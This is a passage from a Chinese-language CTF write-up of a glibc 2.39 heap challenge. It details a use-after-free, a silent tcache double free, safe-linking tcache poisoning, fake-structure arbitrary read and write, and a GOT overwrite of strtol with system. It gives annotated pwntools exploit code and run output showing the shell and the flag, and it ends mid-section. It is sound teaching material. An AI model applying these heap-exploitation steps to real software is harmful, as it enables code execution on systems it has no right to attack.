\begin{Verbatim}[breaklines=true,breakanywhere=true,breakautoindent=false,fontsize=\fontsize{7.0}{9.5}\selectfont]
1) 開兩個 wallet：A（slot 0, size 0x80）、B（slot 1, size 0x80）
2) 選 4) Transfer：FROM=0, TO=1
       → free(A->ledger)
       → B->ledger = <A->ledger 的舊值>（= 剛被 free 的指標）
       → B->size   = A->size = 0x80
       → A->active = 0, A->ledger = NULL
3) 此後 B 還「活著」，但它的 ledger 已經在 tcache / unsorted bin 裡：
       Withdraw(B) → 讀 freed chunk（洩漏）
       Deposit(B)  → 寫 freed chunk（改寫 tcache metadata）
       Transfer(B -> C) → 對同一塊再 free 一次（double free）
\end{Verbatim}

\paragraph{7.2 為什麼 tcache double free 需要「先清
key」}\label{ux70baux4ec0ux9ebc-tcache-double-free-ux9700ux8981ux5148ux6e05-key}

glibc 2.29 之後 \texttt{free()} 會檢查：

\begin{Shaded}
\begin{Highlighting}[]
\ControlFlowTok{if} \OperatorTok{(}\NormalTok{\_\_glibc\_unlikely }\OperatorTok{(}\NormalTok{e}\OperatorTok{{-}\textgreater{}}\NormalTok{key }\OperatorTok{==}\NormalTok{ tcache\_key}\OperatorTok{))}   \CommentTok{// e{-}\textgreater{}key 是這塊 user data 的第 8 byte}
    \OperatorTok{\{} \OperatorTok{...}\NormalTok{掃描整條 tcache 鏈}\OperatorTok{...}\NormalTok{ 找到自己就 abort：}\StringTok{"free(): double free detected in tcache 2"} \OperatorTok{\}}
\end{Highlighting}
\end{Shaded}

而我們的 UAF 寫入剛好能改到那個 \texttt{key}：

\begin{Verbatim}[breaklines=true,breakanywhere=true,breakautoindent=false,fontsize=\fontsize{7.0}{9.5}\selectfont]
   被 free 的 chunk：
      +0x00 next (= safe-linking 編碼值)
      +0x08 key  (= tcache_key)          ← ✶ 用 Deposit() 把它寫成 0
      +0x10 ...
\end{Verbatim}

寫成 0 之後，第二次 \texttt{free()} 的檢查就不會觸發 → \textbf{靜默的
double free}。

\paragraph{7.3
完整的利用鏈（心理模型）}\label{ux5b8cux6574ux7684ux5229ux7528ux93c8ux5fc3ux7406ux6a21ux578b}

\begin{Verbatim}[breaklines=true,breakanywhere=true,breakautoindent=false,fontsize=\fontsize{7.0}{9.5}\selectfont]
   (1) UAF 讀 unsorted bin  →  libc base
   (2) UAF 讀空鏈的 next    →  safe-linking key (user 位址 >> 12)
   (3) UAF 寫 + double free →  tcache[0x30] 鏈中出現兩次同一塊 e
   (4) 把 e->next 改成 PROTECT_PTR(e, &slots[0])  →  tcache poisoning
   (5) 連續兩次 malloc(0x20)：
        第一次回傳 e（正常）
        第二次回傳 0x4040c0 = ✶ slot 表！
   (6) 那個 wallet 的 ledger 就變成 slot 表本身（size 0x20）
      → Deposit 它 = 改寫 slots[0..3]
      → 在 .bss 造一個「假 wallet」，讓 slot[2] 指向它
      → 之後對 slot[2] 做 Deposit/Withdraw = 任意位址寫 / 任意位址讀
   (7) 任意寫：strtol@got = system
   (8) 輸入 "/bin/sh"  →  選單的 strtol(buf,...) 其實呼叫了 system(buf) → getshell
\end{Verbatim}

\textbf{tcache 串列的三種狀態（步驟 ③④ 的細節，每一步都用 gdb 驗過）：}

\begin{Verbatim}[breaklines=true,breakanywhere=true,breakautoindent=false,fontsize=\fontsize{7.0}{9.5}\selectfont]
 (2a) transfer(2,3) 剛 free 完 P，而 tcache[0x30] 原本是空的：
      tcache->entries[1] ──► [P]
      P->next = (P >> 12) ^ NULL = P >> 12   ← ✶「key」就是這樣洩漏的
      （UAF 讀 P 的前 8 bytes 就等於 P>>12）

 (2b) 先 UAF write 清掉 next/key，再 free 一次（double free 成功），
      然後把「已經在鏈上的 P」的 next 寫成 PROTECT_PTR(P, P)：
      tcache->entries[1] ──► [P] ──next──► [P]      ← ✶ 環！（自我參照）
      P->next = P ^ (P >> 12)   → 用「洩漏出來的值」反推就能還原 P

 (2c) 把 P->next 改成 PROTECT_PTR(P, &slots[0]) = (P>>12) ^ 0x4040c0：
      tcache->entries[1] ──► [P] ──next──► 0x4040c0
                             ▲                 ▲
              malloc #1 回傳 ┘                 └─ ✶ malloc #2 回傳「slot 表本身」！
\end{Verbatim}

為什麼選 \texttt{slot\ \allowbreak{}表} 當毒化目標？因為 \texttt{Open\ \allowbreak{}Wallet} 在
malloc 之後會
\texttt{memset(回傳值,\allowbreak{}\ \allowbreak{}0,\allowbreak{}\ \allowbreak{}size)}（\texttt{\_\allowbreak{}\_\allowbreak{}memset\_\allowbreak{}chk}）。若目標是
GOT，就會把 GOT 清成 0 而當掉。 但目標是 slot 表、size 只有
\texttt{0x20} 時，只會清掉 \texttt{slots{[}0..\allowbreak{}3{]}}（4 個 8-byte），
\textbf{不會影響程式繼續運作}，而新 wallet 會被存到掃描時就決定好的
slot（\textgreater=4）。

\paragraph{7.4 假 wallet
的算術（本題最漂亮的一步）}\label{ux5047-wallet-ux7684ux7b97ux8853ux672cux984cux6700ux6f02ux4eaeux7684ux4e00ux6b65}

\begin{Verbatim}[breaklines=true,breakanywhere=true,breakautoindent=false,fontsize=\fontsize{7.0}{9.5}\selectfont]
   slots[] 在 0x4040c0。我們能寫 slots[0..3]，也就是 0x4040c0 ~ 0x4040df。
   把「假 wallet」放在 0x4040a8（slot 表前面 0x18 bytes 的 .bss 空地），則：

      假wallet+0x18 = 0x4040c0 = &slots[0]  → fake->ledger = slots[0] 的值
      假wallet+0x20 = 0x4040c8 = &slots[1]  → fake->size   = slots[1] 的值
      假wallet+0x28 = 0x4040d0 = &slots[2]  → fake->active = (int)slots[2]（非 0 即可）
                                             ✶ 同時 slots[2] 就是「指向假 wallet 的格子」
\end{Verbatim}

所以只要一次 \texttt{Deposit(被毒化的\ \allowbreak{}slot)} 寫 32 bytes：

\begin{Verbatim}[breaklines=true,breakanywhere=true,breakautoindent=false,fontsize=\fontsize{7.0}{9.5}\selectfont]
   payload = p64(目標位址) + p64(長度) + p64(0x4040a8) + p64(0)
                    ↑slots[0]      ↑slots[1]     ↑slots[2]（假 wallet 自己）
\end{Verbatim}

之後：

\begin{Verbatim}[breaklines=true,breakanywhere=true,breakautoindent=false,fontsize=\fontsize{7.0}{9.5}\selectfont]
   Withdraw(2)  →  write(1, 目標位址, 長度)   ← 任意位址讀
   Deposit(2)   →  read(0, 目標位址, 長度)    ← 任意位址寫
\end{Verbatim}

而且隨時可以再用 \texttt{Deposit(被毒化的\ \allowbreak{}slot)} 重新指定「目標位址 /
長度」， 所以是\textbf{可重複使用}的任意讀寫。

\begin{center}\rule{0.5\linewidth}{0.5pt}\end{center}

\subsubsection{8. exploit
逐行註解}\label{exploit-ux9010ux884cux8a3bux89e3}

完整程式在 \texttt{exploit.\allowbreak{}py}。下面按階段解釋。

\paragraph{8.0 常數}\label{ux5e38ux6578}

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{SLOTS      }\OperatorTok{=} \BaseNTok{0x4040c0}   \CommentTok{\# wallet *slots[16]}
\NormalTok{GOT        }\OperatorTok{=} \BaseNTok{0x404000}   \CommentTok{\# .got.plt}
\NormalTok{STRTOL\_GOT }\OperatorTok{=} \BaseNTok{0x404040}
\NormalTok{FAKE\_WALLET}\OperatorTok{=} \BaseNTok{0x4040a8}   \CommentTok{\# 假 wallet 的位置（見 §7.4）}
\NormalTok{FAKE\_INDEX }\OperatorTok{=} \DecValTok{2}          \CommentTok{\# slots[2] 指向假 wallet}
\NormalTok{POISON\_SLOT}\OperatorTok{=} \DecValTok{6}          \CommentTok{\# 被毒化、ledger 指向 slot 表的 wallet 所在 slot（推導見 §8.3）}

\NormalTok{OFF\_UNSORTED }\OperatorTok{=} \BaseNTok{0x203b20} \CommentTok{\# \&main\_arena.bins[0]（gdb 實測：fd {-} libc\_base）}
\NormalTok{OFF\_SYSTEM   }\OperatorTok{=} \BaseNTok{0x58740}  \CommentTok{\# Ubuntu 24.04 glibc 2.39 的 system()}
\NormalTok{LIBC\_FP }\OperatorTok{=}\NormalTok{ \{...\}         }\CommentTok{\# 各 GOT 項目的 offset，用來「指紋比對」確認 libc 版本}
\end{Highlighting}
\end{Shaded}

\paragraph{8.1 Phase 1：libc leak（unsorted
bin）}\label{phase-1libc-leakunsorted-bin}

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{open\_wallet(}\StringTok{b\textquotesingle{}S\textquotesingle{}}\NormalTok{, }\BaseNTok{0x80}\NormalTok{)         }\CommentTok{\# slot 0}
\NormalTok{open\_wallet(}\StringTok{b\textquotesingle{}D\textquotesingle{}}\NormalTok{, }\BaseNTok{0x80}\NormalTok{)         }\CommentTok{\# slot 1}
\ControlFlowTok{for}\NormalTok{ i }\KeywordTok{in} \BuiltInTok{range}\NormalTok{(}\DecValTok{7}\NormalTok{):}
\NormalTok{    open\_wallet(}\StringTok{b\textquotesingle{}W\%d\textquotesingle{}} \OperatorTok{\%}\NormalTok{ i, }\BaseNTok{0x80}\NormalTok{)   }\CommentTok{\# slots 2..8}
\ControlFlowTok{for}\NormalTok{ i }\KeywordTok{in} \BuiltInTok{range}\NormalTok{(}\DecValTok{2}\NormalTok{, }\DecValTok{9}\NormalTok{):}
\NormalTok{    close\_wallet(i)             }\CommentTok{\# 7 次 free(0x90) → tcache[0x90] 剛好滿（7/7）}
\NormalTok{transfer(}\DecValTok{0}\NormalTok{, }\DecValTok{1}\NormalTok{)                  }\CommentTok{\# free(S ledger)：tcache 滿 → 往下走 → unsorted bin}
\NormalTok{leak }\OperatorTok{=}\NormalTok{ withdraw\_n(}\DecValTok{1}\NormalTok{, }\BaseNTok{0x80}\NormalTok{)      }\CommentTok{\# ✶ UAF 讀}
\NormalTok{unsorted }\OperatorTok{=}\NormalTok{ u64(leak[}\DecValTok{0}\NormalTok{:}\DecValTok{8}\NormalTok{])       }\CommentTok{\# = \&main\_arena.bins[0]}
\NormalTok{libc }\OperatorTok{=}\NormalTok{ unsorted }\OperatorTok{{-}} \BaseNTok{0x203b20}
\end{Highlighting}
\end{Shaded}

\textbf{為什麼會進 unsorted bin？} 0x90 的 chunk 比
\texttt{global\_\allowbreak{}max\_\allowbreak{}fast}(0x80) 大， 所以 tcache 滿了之後不會進
fastbin，而是走 normal 路徑 → 丟進 unsorted bin。

\textbf{換算公式：}

\begin{Verbatim}[breaklines=true,breakanywhere=true,breakautoindent=false,fontsize=\fontsize{7.0}{9.5}\selectfont]
   leak1[0x00..0x08] = main_arena.bins[0] = libc_base + 0x203ac0 + 0x60
   libc_base = leak - 0x203b20
\end{Verbatim}

\paragraph{8.2 Phase 2a：safe-linking
key}\label{phase-2asafe-linking-key}

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{open\_wallet(}\StringTok{b\textquotesingle{}P0\textquotesingle{}}\NormalTok{, }\BaseNTok{0x20}\NormalTok{)   }\CommentTok{\# slot 2}
\NormalTok{open\_wallet(}\StringTok{b\textquotesingle{}P1\textquotesingle{}}\NormalTok{, }\BaseNTok{0x20}\NormalTok{)   }\CommentTok{\# slot 3}
\NormalTok{open\_wallet(}\StringTok{b\textquotesingle{}P2\textquotesingle{}}\NormalTok{, }\BaseNTok{0x20}\NormalTok{)   }\CommentTok{\# slot 4}
\NormalTok{transfer(}\DecValTok{2}\NormalTok{, }\DecValTok{3}\NormalTok{)             }\CommentTok{\# free(P0 ledger, 0x30 chunk) → tcache[0x30] 原本是空的}
\NormalTok{l    }\OperatorTok{=}\NormalTok{ withdraw\_n(}\DecValTok{3}\NormalTok{, }\BaseNTok{0x20}\NormalTok{) }\CommentTok{\# ✶ UAF 讀}
\NormalTok{safe }\OperatorTok{=}\NormalTok{ u64(l[}\DecValTok{0}\NormalTok{:}\DecValTok{8}\NormalTok{])         }\CommentTok{\# = (user 位址 \textgreater{}\textgreater{} 12) \^{} NULL = user 位址 \textgreater{}\textgreater{} 12  ← safe{-}linking key}
                           \CommentTok{\#   ✶ 是 malloc() 回傳的 user 位址，不是 chunk 標頭（§5.4 實測）}
\end{Highlighting}
\end{Shaded}

\begin{quote}
這裡 \textbf{不需要知道 chunk 的完整位址}，因為編碼只用得到
\texttt{user\ \allowbreak{}位址\ \allowbreak{}\textgreater{}\allowbreak{}\textgreater{}\allowbreak{}\ \allowbreak{}12} （key ＝
\texttt{\&\allowbreak{}e-\allowbreak{}\textgreater{}\allowbreak{}next\ \allowbreak{}\textgreater{}\allowbreak{}\textgreater{}\allowbreak{}\ \allowbreak{}12}，而
\texttt{\&\allowbreak{}e-\allowbreak{}\textgreater{}\allowbreak{}next} 就是 user 位址 = 標頭 + 0x10）。 這也讓
exploit 不會因為 heap 佈局（例如 stdio buffer 大小）不同而失敗。
\end{quote}

\paragraph{8.3 Phase 2b：tcache
poisoning}\label{phase-2btcache-poisoning}

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{deposit(}\DecValTok{3}\NormalTok{, p64(}\DecValTok{0}\NormalTok{)}\OperatorTok{*}\DecValTok{4}\NormalTok{)              }\CommentTok{\# UAF 寫：把 tcache key 清成 0（同時 next 也歸零）}
\NormalTok{transfer(}\DecValTok{3}\NormalTok{, }\DecValTok{4}\NormalTok{)                    }\CommentTok{\# 對同一塊再 free → double free（靜默通過）→ counts=2}
\NormalTok{deposit(}\DecValTok{4}\NormalTok{, p64(safe }\OperatorTok{\^{}}\NormalTok{ SLOTS) }\OperatorTok{+}\NormalTok{ p64(}\DecValTok{0}\NormalTok{)}\OperatorTok{*}\DecValTok{3}\NormalTok{)}
                                  \CommentTok{\# ✶ 寫入 e{-}\textgreater{}next = PROTECT\_PTR(e, \&slots[0])}
                                  \CommentTok{\#   實際存放值 = (user 位址\textgreater{}\textgreater{}12) \^{} 0x4040c0 = safe \^{} SLOTS}
\NormalTok{open\_wallet(}\StringTok{b\textquotesingle{}P3\textquotesingle{}}\NormalTok{, }\BaseNTok{0x20}\NormalTok{)          }\CommentTok{\# 第 1 次 malloc(0x20)：拿到 e，並把 entries ← \&slots[0]}
\NormalTok{open\_wallet(}\StringTok{b\textquotesingle{}P4\textquotesingle{}}\NormalTok{, }\BaseNTok{0x20}\NormalTok{)          }\CommentTok{\# 第 2 次 malloc(0x20)：✶✶ 回傳 0x4040c0（slot 表！）}
\end{Highlighting}
\end{Shaded}

\texttt{P4} 的 wallet 結構在 heap，但它的
\texttt{ledger\ \allowbreak{}=\ \allowbreak{}0x4040c0}、\texttt{size\ \allowbreak{}=\ \allowbreak{}0x20}。 \texttt{Open}
裡的 \texttt{memset\_\allowbreak{}chk(0x4040c0,\allowbreak{}\ \allowbreak{}0,\allowbreak{}\ \allowbreak{}0x20)} 只清掉
\texttt{slots{[}0..\allowbreak{}3{]}}， 而 P4 被存進掃描階段就決定好的
slot（\textgreater= 4，本例是 slot 6），所以不受影響。

\subparagraph{\texorpdfstring{\texttt{POISON\_\allowbreak{}SLOT\ \allowbreak{}=\ \allowbreak{}6}
是怎麼算出來的？}{POISON\_SLOT = 6 是怎麼算出來的？}}\label{poison_slot-6-ux662fux600eux9ebcux7b97ux51faux4f86ux7684}

\texttt{Open\ \allowbreak{}Wallet} 的 slot 掃描\textbf{只看
\texttt{slots{[}i{]}\ \allowbreak{}==\ \allowbreak{}NULL}}（§4.3 的 \texttt{4015e0}）， 而且
\textbf{\texttt{slots{[}i{]}} 只有 \texttt{Close} 才會被設成
NULL}（\texttt{Transfer} 只把 \texttt{active} 設 0、 \texttt{ledger} 設
NULL，\textbf{slot 格子本身沒有清掉}）。把每一步排出來：

\begin{Verbatim}[breaklines=true,breakanywhere=true,breakautoindent=false,fontsize=\fontsize{7.0}{9.5}\selectfont]
Open S           → slot 0        （slots[0] 非 NULL）
Open D           → slot 1        （slots[1] 非 NULL）
Open W0..W6      → slots 2..8
Close 2..8       → slots 2..8 全部變 NULL          ← 只有 Close 會清格子
Open P0          → slot 2        （第一個 NULL）
Open P1          → slot 3
Open P2          → slot 4
transfer(2, 3)   → slot2 仍非 NULL！（P0 只是 active=0、ledger=NULL）
Open P3          → slot 5        ← 掃到 5 才空
Open P4          → slot 6        ← ✶ 所以 POISON_SLOT = 6
\end{Verbatim}

\texttt{P4} 就是「ledger 被毒化成 \texttt{\&\allowbreak{}slots{[}0{]}}」的那個
wallet，所以之後 \texttt{Deposit(6,\allowbreak{}\ \allowbreak{}...)} 寫的其實是 slot
表本身，\texttt{Withdraw(6,\allowbreak{}\ \allowbreak{}...)} 讀的是 slot 表。

\paragraph{8.4 Phase 3：假 wallet →
任意讀寫}\label{phase-3ux5047-wallet-ux4efbux610fux8b80ux5beb}

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{deposit(POISON\_SLOT, p64(GOT) }\OperatorTok{+}\NormalTok{ p64(}\BaseNTok{0x70}\NormalTok{) }\OperatorTok{+}\NormalTok{ p64(FAKE\_WALLET) }\OperatorTok{+}\NormalTok{ p64(}\DecValTok{0}\NormalTok{))}
\CommentTok{\#  slots[0] = 0x404000 (GOT)   → fake{-}\textgreater{}ledger}
\CommentTok{\#  slots[1] = 0x70             → fake{-}\textgreater{}size}
\CommentTok{\#  slots[2] = 0x4040a8         → 指向假 wallet 自己，同時 fake{-}\textgreater{}active 非 0}
\NormalTok{got }\OperatorTok{=}\NormalTok{ withdraw\_n(FAKE\_INDEX, }\BaseNTok{0x70}\NormalTok{)     }\CommentTok{\# 任意讀：dump 整個 GOT}
\end{Highlighting}
\end{Shaded}

接著做 \textbf{libc 指紋比對}：把 GOT 裡的每個函式位址減掉算出來的 libc
base， 和 Ubuntu 24.04 glibc 2.39 的已知 offset 逐一比較：

\begin{Verbatim}[breaklines=true,breakanywhere=true,breakautoindent=false,fontsize=\fontsize{7.0}{9.5}\selectfont]
free   +0xadd20      puts    +0x87bd0     write   +0x11c560   read   +0x11ba50
fgets  +0x85b20      calloc  +0xae790     strtol  +0x543c0    malloc +0xad640
setvbuf+0x88540
\end{Verbatim}

遠端實測\textbf{全部吻合} → 確定遠端就是同一個
libc，\texttt{system\ \allowbreak{}=\ \allowbreak{}+0x58740} 可以放心用。

\paragraph{8.5 Phase 4：GOT hijack →
shell}\label{phase-4got-hijack-shell}

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{deposit(POISON\_SLOT, p64(STRTOL\_GOT) }\OperatorTok{+}\NormalTok{ p64(}\DecValTok{8}\NormalTok{) }\OperatorTok{+}\NormalTok{ p64(FAKE\_WALLET) }\OperatorTok{+}\NormalTok{ p64(}\DecValTok{0}\NormalTok{))}
\CommentTok{\#  重新指定：目標 = 0x404040 (strtol@got)，長度 = 8}
\NormalTok{deposit(FAKE\_INDEX, p64(system))       }\CommentTok{\# ✶ 任意寫：strtol@got = system}
\NormalTok{io.sendline(}\StringTok{b\textquotesingle{}/bin/sh\textquotesingle{}}\NormalTok{)}
\CommentTok{\#  選單會執行 fgets(buf,0x20); strtol(buf,NULL,10)}
\CommentTok{\#  但 GOT 已經換成 system，rdi = buf = "/bin/sh" → system("/bin/sh") → shell！}
\end{Highlighting}
\end{Shaded}

\paragraph{8.6 為什麼 exploit 的 I/O
要「分批」（實戰重點）}\label{ux70baux4ec0ux9ebc-exploit-ux7684-io-ux8981ux5206ux6279ux5be6ux6230ux91cdux9ede}

這題遠端有 \textbf{約 30 秒的連線時限}，而每次 round trip 約 0.3 秒。
原本一步等一下 prompt 的寫法要 35 次往返 ≈ 30 秒 →
\textbf{剛好在最後一步被切斷}。

所以我把可以合併的輸入全部打包成少數幾次 \texttt{send()}：

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{b  }\OperatorTok{=}\NormalTok{ op\_open(...) }\OperatorTok{+}\NormalTok{ op\_close(...) }\OperatorTok{+}\NormalTok{ op\_transfer(...) }\OperatorTok{+}\NormalTok{ op\_withdraw(...) ...}
\NormalTok{io.send(b)        }\CommentTok{\# 一整包送出去，程式自己照順序吃掉}
\end{Highlighting}
\end{Shaded}

\textbf{但是 \texttt{Deposit} 不能這樣打包！} 原因見下一節（stdio 的
read-ahead）， 所以每個 Deposit 都必須：

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{io.send(}\StringTok{b\textquotesingle{}2}\CharTok{\textbackslash{}n}\StringTok{\textquotesingle{}} \OperatorTok{+} \BuiltInTok{str}\NormalTok{(idx).encode() }\OperatorTok{+} \StringTok{b\textquotesingle{}}\CharTok{\textbackslash{}n}\StringTok{\textquotesingle{}}\NormalTok{)   }\CommentTok{\# 先送「選單選項 + wallet 編號」}
\NormalTok{io.recvuntil(}\StringTok{b\textquotesingle{}Enter transaction data: \textquotesingle{}}\NormalTok{)     }\CommentTok{\# 等它印出提示}
\NormalTok{io.send(payload }\OperatorTok{+}\NormalTok{ trailing)                   }\CommentTok{\# 才送 raw payload}
\end{Highlighting}
\end{Shaded}

\begin{center}\rule{0.5\linewidth}{0.5pt}\end{center}

\subsubsection{9.
實際執行結果}\label{ux5be6ux969bux57f7ux884cux7d50ux679c-3}

\paragraph{\texorpdfstring{9.1 本地（\texttt{./\allowbreak{}flag.\allowbreak{}txt} 放假的
flag）}{9.1 本地（./flag.txt 放假的 flag）}}\label{ux672cux5730.flag.txt-ux653eux5047ux7684-flag}

\begin{Verbatim}[breaklines=true,breakanywhere=true,breakautoindent=false,fontsize=\fontsize{7.0}{9.5}\selectfont]
$ python3 exploit.py
[x] Starting local process '/home/kzzz/Documents/code/ctf/sunshine/pwn4/ld-linux-x86-64.so.2'
[+] Starting local process '/home/kzzz/Documents/code/ctf/sunshine/pwn4/ld-linux-x86-64.so.2': pid 3544551
[+] unsorted bin head : 0x7fb8b5a03b20
[+] libc base         : 0x7fb8b5800000
[+] safe-linking key  : 0x555569c11
[+] libc fingerprint  : Ubuntu glibc 2.39 (all GOT entries match)
[+] system() = 0x7fb8b5858740
[+] Deposited 8 bytes. New balance: 8      ← ✶ 程式印的（Deposit 成功）

--- MAIN MENU ---                          ← ✶ 程式又跑了一輪選單
1) Open Wallet
2) Deposit (write to ledger)
3) Withdraw (read from ledger)
4) Transfer
5) Close Wallet
6) List Wallets
0) Exit
>>> sun{LOCAL_TEST_FLAG}                   ← 從這裡開始是我們的 shell 指令輸出
total 2500
drwxr-xr-x  3 kzzz kzzz    4096 Sep 28 01:03 .
... （ls -la 的其餘行省略）
uid=1001(kzzz) gid=1001(kzzz) groups=1001(kzzz),65534(nobody)
DONE

FLAG: sun{LOCAL_TEST_FLAG}
[*] Stopped process '/home/kzzz/Documents/code/ctf/sunshine/pwn4/ld-linux-x86-64.so.2' (pid 3544551)
\end{Verbatim}

\begin{quote}
※提示 \textbf{新手最容易以為「我跑壞了」的四件事}： 1. 開頭那兩行
\texttt{{[}x{]}\ \allowbreak{}Starting\ \allowbreak{}local\ \allowbreak{}process\ \allowbreak{}...} /
\texttt{{[}+{]}\ \allowbreak{}Starting\ \allowbreak{}local\ \allowbreak{}process\ \allowbreak{}...:\allowbreak{}\ \allowbreak{}pid\ \allowbreak{}NNNN} 是
\textbf{pwntools} 印的（每次 pid、位址都不同），不是程式輸出。 2.
\texttt{{[}+{]}\ \allowbreak{}Deposited\ \allowbreak{}8\ \allowbreak{}bytes.\allowbreak{}\ \allowbreak{}New\ \allowbreak{}balance:\allowbreak{}\ \allowbreak{}8} 與整段
\texttt{MAIN\ \allowbreak{}MENU} 是\textbf{程式自己}印的 （\texttt{Deposit} 的訊息 +
選單迴圈又跑一輪）。 3. \texttt{DONE}
後面若出現奇怪的空白／殘留字元是正常的（free 過的 chunk
內還留著舊資料）。 4.
恆等式檢查：\texttt{unsorted\ \allowbreak{}-\allowbreak{}\ \allowbreak{}libc\ \allowbreak{}=\ \allowbreak{}0x203b20}
（\texttt{0x7fb8b5a03b20\ \allowbreak{}-\allowbreak{}\ \allowbreak{}0x7fb8b5800000}
✓）、\texttt{system\ \allowbreak{}-\allowbreak{}\ \allowbreak{}libc\ \allowbreak{}=\ \allowbreak{}0x58740}
（\texttt{0x7fb8b5858740\ \allowbreak{}-\allowbreak{}\ \allowbreak{}0x7fb8b5800000}
✓）。你的數字一定不同，但\textbf{差值}必須一樣。
\end{quote}

\paragraph{9.2 遠端（真實 flag）}\label{ux9060ux7aefux771fux5be6-flag}

\begin{Verbatim}[breaklines=true,breakanywhere=true,breakautoindent=false,fontsize=\fontsize{7.0}{9.5}\selectfont]
$ python3 exploit.py REMOTE
[x] Opening connection to chal.sunshinectf.games on port 26004
[x] Opening connection to chal.sunshinectf.games on port 26004: Trying 35.211.211.18
[+] Opening connection to chal.sunshinectf.games on port 26004: Done
[+] unsorted bin head : 0x74d24f3e9b20
[+] libc base         : 0x74d24f1e9000
[+] safe-linking key  : 0x2e22b
[+] libc fingerprint  : Ubuntu glibc 2.39 (all GOT entries match)
[+] system() = 0x74d24f241740
[+] Deposited 8 bytes. New balance: 8

--- MAIN MENU ---
1) Open Wallet
2) Deposit (write to ledger)
3) Withdraw (read from ledger)
4) Transfer
5) Close Wallet
6) List Wallets
0) Exit
>>> sun{s4fe_l1nk1ng_w0nt_s4ve_y0ur_tc4che}
total 12
drwxr-xr-x 2 root root        4096 Sep 26 00:21 .
drwxr-xr-x 1 root root        4096 Sep 26 00:54 ..
-rw-r----- 1 root cache_money   40 Sep 26 00:13 flag.txt
uid=1337(cache_money) gid=1337(cache_money) groups=1337(cache_money)
DONE


FLAG: sun{s4fe_l1nk1ng_w0nt_s4ve_y0ur_tc4che}
[*] Closed connection to chal.sunshinectf.games port 26004
\end{Verbatim}

\begin{quote}
※提示 \textbf{遠端連線 pwntools 會印「兩行」}：
\texttt{{[}x{]}\ \allowbreak{}Opening\ \allowbreak{}connection\ \allowbreak{}...:\allowbreak{}\ \allowbreak{}Trying\ \allowbreak{}35.\allowbreak{}211.\allowbreak{}211.\allowbreak{}18}（開始嘗試）與
\texttt{{[}+{]}\ \allowbreak{}Opening\ \allowbreak{}connection\ \allowbreak{}...:\allowbreak{}\ \allowbreak{}Done}（成功）。只看到一行不代表只做了一次動作。
\texttt{libc\ \allowbreak{}fingerprint\ \allowbreak{}:\allowbreak{}\ \allowbreak{}...\allowbreak{}\ \allowbreak{}all\ \allowbreak{}GOT\ \allowbreak{}entries\ \allowbreak{}match} 代表 11 個
GOT 項目扣掉我們的 libc base 之後\textbf{全部命中}已知 offset →
確認遠端就是同一份 2.39 libc（不是硬猜 offset）。
\end{quote}

\textbf{真實
flag：\texttt{sun\{\allowbreak{}s4fe\_\allowbreak{}l1nk1ng\_\allowbreak{}w0nt\_\allowbreak{}s4ve\_\allowbreak{}y0ur\_\allowbreak{}tc4che\}\allowbreak{}}}

\begin{center}\rule{0.5\linewidth}{0.5pt}\end{center}

\subsubsection{10.
常見坑（我實際踩過的都列在這）}\label{ux5e38ux898bux5751ux6211ux5be6ux969bux8e29ux904eux7684ux90fdux5217ux5728ux9019}

\paragraph{\texorpdfstring{坑 1 ★★★：\texttt{fgets} 的 read-ahead
會「吃掉」raw \texttt{read()} 的
payload}{坑 1 ★★★：fgets 的 read-ahead 會「吃掉」raw read() 的 payload}}\label{ux5751-1-fgets-ux7684-read-ahead-ux6703ux5403ux6389raw-read-ux7684-payload}

這是我卡最久的一個，非常值得學：

\begin{itemize}
\tightlist
\item
  \texttt{Deposit} 用的是 \textbf{raw \texttt{read(0,\allowbreak{}\ \allowbreak{}ptr,\allowbreak{}\ \allowbreak{}size)}}（fd
  直接讀）。
\item
  其他操作用的是 \textbf{\texttt{fgets}}，而 \texttt{fgets} 底層是
  stdio：第一次讀會 \texttt{read(0,\allowbreak{}\ \allowbreak{}stdio\_\allowbreak{}buf,\allowbreak{}\ \allowbreak{}4096)}
  \textbf{一次讀一大塊}進來（read-ahead）。
\item
  如果我們把
  \texttt{"2\textbackslash{}\allowbreak{}n3\textbackslash{}\allowbreak{}n"\ \allowbreak{}+\ \allowbreak{}\textless{}\allowbreak{}32\ \allowbreak{}bytes\ \allowbreak{}payload\textgreater{}\allowbreak{}}
  一次送出去， 程式在處理選單的 \texttt{fgets} 時就會把\textbf{全部 38
  bytes 吸進 stdio 緩衝區}， 之後的 \texttt{read(0,\allowbreak{}\ \allowbreak{}ptr,\allowbreak{}\ \allowbreak{}32)} 去
  kernel 拿資料時\textbf{什麼都沒有} → 卡住等待。
\end{itemize}

\textbf{解法}：raw payload 一定要\textbf{看到對應的提示之後才送}
（\texttt{Enter\ \allowbreak{}transaction\ \allowbreak{}data:} 是在 \texttt{read()}
之前印出的，此時 fgets 已經讀完）。

同一個坑也會發生在「拿到 shell 之後」：\texttt{system("/\allowbreak{}bin/\allowbreak{}sh")}
之前如果 把 shell 指令跟 \texttt{/\allowbreak{}bin/\allowbreak{}sh}
黏在同一個封包送出，指令會被程式的 stdio 吞掉， shell 什麼都收不到 →
所以要先送 \texttt{/\allowbreak{}bin/\allowbreak{}sh}，等一下，再送指令。

\paragraph{坑 2：tcache 最多 7 個（而且會被「開新
wallet」偷偷消耗）}\label{ux5751-2tcache-ux6700ux591a-7-ux500bux800cux4e14ux6703ux88abux958bux65b0-walletux5077ux5077ux6d88ux8017}

第一次寫的時候我「開 8 個 wallet 再關 7 個」想填滿 tcache， 結果
transfer 之後 free 的 chunk 竟然還是進了 tcache（\texttt{next}
看起來像明文）。

原因：\textbf{\texttt{Open\ \allowbreak{}Wallet} 的 \texttt{malloc(size)} 會從 tcache
拿走一個}！ 正確做法是「先開好 source/destination，再另外開 7 個來關」。

\paragraph{坑 3：遠端有 30
秒連線時限}\label{ux5751-3ux9060ux7aefux6709-30-ux79d2ux9023ux7ddaux6642ux9650}

\begin{Verbatim}[breaklines=true,breakanywhere=true,breakautoindent=false,fontsize=\fontsize{7.0}{9.5}\selectfont]
[10.5s] alive ... [28.6s] alive ... [30.2s] CONNECTION DEAD
\end{Verbatim}

每次往返 0.3s × 35 次 ≈ 30s → 必須批次化輸入（見 §8.6）。

\paragraph{坑 4：glibc
